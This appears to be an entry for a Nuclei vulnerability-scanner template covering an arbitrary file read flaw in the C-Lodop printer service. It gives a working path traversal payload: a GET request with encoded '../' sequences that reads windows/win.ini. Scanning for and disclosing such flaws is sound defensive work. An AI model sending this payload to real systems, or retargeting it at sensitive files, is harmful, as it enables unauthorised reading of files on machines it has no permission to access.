# Nuclei Template: C-Lodop Printer - Arbitrary File Read
**Template ID:** clodop-printer-lfi
**Vulnerability Class:** Relative Path Traversal
**Severity:** High
**CWE:** CWE-23
**Source:** Nuclei Template (`clodop-printer-lfi.yaml`)

## Vulnerability Information & PoC

## Description
The C-Lodop printer has an arbitrary file reading vulnerability. By constructing a special URL, it can read any file in the system.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fwindows%2fwin.ini
```

## References
- https://github.com/Threekiii/Awesome-POC/blob/8e4f0be1f75a71cffe4b2c2c558ad1cd4d03d9a7/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/C-Lodop%E6%89%93%E5%8D%B0%E6%9C%BA%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md
